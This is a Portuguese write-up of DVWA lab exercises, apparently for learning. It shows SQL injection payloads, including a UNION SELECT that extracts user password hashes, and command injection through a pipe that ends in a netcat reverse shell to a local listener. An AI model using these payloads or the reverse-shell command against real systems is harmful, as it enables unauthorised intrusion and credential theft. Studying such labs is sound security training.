## SQL Injection
Para entender como a aplicação reage, abri ela no burp suite. 
![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/07160079-d0b3-4b28-8d29-716c2007c600)

Adicionando um `'` (aspas simples) para observar o comportamento da aplicação.
```
id=1'&Submit=Submit
```
![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/ee05e500-82bd-4ff9-9a58-b56884bb48a2)

Isso significa que a aplicação é vulnerável a SQL Injection, visto que quando o usuário insere uma aspa simples, ela dá erro, significando que o tratamento da entrada do usuário não é realizado. 
Para tentar entender o que estava acontencendo, tentei mais um teste comum.
```
id=1'or 1'='1&Submit=Submit
```
![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/3ba1491f-624c-4858-bfc2-534401d6327a)
kali
Na mensagem de erro é possível observar que a cada aspas simples (`'`) inserida é adicionado um contrabarra. Pesquisando e lendo nos artigos *more information*, descobri que isso ocorre, pois é utilizado a função `mysqli_real_escape_string();` que visa prevenir injeções de código por meio de escapar de todos os caracteres especiais do SQL. Portanto, os seguintes caracteres não funcionarão: `\x00`, `\n`, `\r`, `\`, `'`, `"` e `\x1a`

Logo, tentando o teste novamente só que retirando as aspas simples temos:
```
id=1 or 1=1&Submit=Submit
```
![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/58b2ea4a-9b2f-4871-b0e3-96d4385159b9)

Para tentar ver as senhas dos usuários usei UNION attacks (uma forma de executar um SELECT adicional).

Nas minhas primeiras tentativas, tentei algo do tipo:
```
id=1 UNION SELECT password FROM users&Submit=Submit
```
Estava supondo que a tabela se chamava users. 

Mas apenas conseguia o seguinte erro:

![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/c1805638-1f7a-4924-84e7-eca300928d23)



Pesquisando, encontrei que o erro ocorre quando você realiza mais de um SELECT na mesma query e eles retornam uma quantidade diferente de colunas. Nesse caso, conseguimos deduzir que o primeiro SELECT está buscando duas colunas (name, surname). Portanto, temos que buscar duas colunas também.
```
id=1 UNION SELECT user, password FROM users&Submit=Submit
```
![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/fc16a743-8ede-4ec7-ac37-1064cb0b677b)

Aparentemente, as senhas foram armazenadas usando hash.

## Command Injection

**Objetivo:**

> Remotely, find out the user of the web service on the OS, as well as the machines hostname via RCE


Para tentar entender como funcionava a aplicação, testei um ip qualquer.

![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/00138f73-f13b-4d86-a34b-ae69a8e470a5)

Percenbendo que basicamente era executado um ping, tentei executar outro comando em sua sequência usando o operador ponto e virgula (`;`). 

![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/ed3b4796-156d-43c9-bb21-70da1bdd07ad)

E nada acontece, portanto deu errado.


Lembrei que existe outra maneira de executar um comando atrás do outro, o pipe (`|`). Teste, mesmo sabendo que o pipe depende da operação anterior estar correta, não ter sem erros nos processos anteriores e dos resultados dos processos anteriores. Normalmente, é utilizado para ter a saída do processo anterior como entrada no processo corrente. 

![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/eadf4f44-3bb4-4d22-9eb1-c92419ebaf9f)

Deu certo. 

Com isso dando certo, tentei reverse shell

No terminal, descobri o meu ip local usando ifconfig, e usei um necat para criar um servidor para ouvir `nc -lvnp 8181`

```
1.1.1.1 | nc 10.0.2.15 8181 -e /bin/bash
```
![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/fbda6cac-79b1-4814-b640-a2a8ae967e93)


Adicionei um sleep, para dar tempo de executar outros comandos. 
```
.1 | sleep 50 | nc 10.0.2.15 8181 -e /bin/bash
```

![image](https://github.com/DuPorangaba/DVWA_writeup/assets/62816035/ef78a68e-9ec7-4d46-b8b6-9c3abaa99011)
